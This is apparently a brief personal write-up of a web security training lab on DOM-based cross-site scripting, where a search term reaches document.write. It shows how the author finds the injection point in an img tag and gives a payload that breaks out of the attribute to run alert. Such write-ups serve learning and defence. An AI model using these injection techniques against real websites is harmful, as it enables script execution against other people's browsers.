# Lab: DOM XSS in document.write sink using source location.search

 This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 

Vulnerable area: search functionality

Write `123` into search bar and see where in the dom `123` is inserted

I found it here:

`<img src="/resources/images/tracker.gif?searchTerms=123">`

Escaped from img tag and create new script tag, calling an alert:

`"><script>onload=alert('hi')</script>`

Lab solved!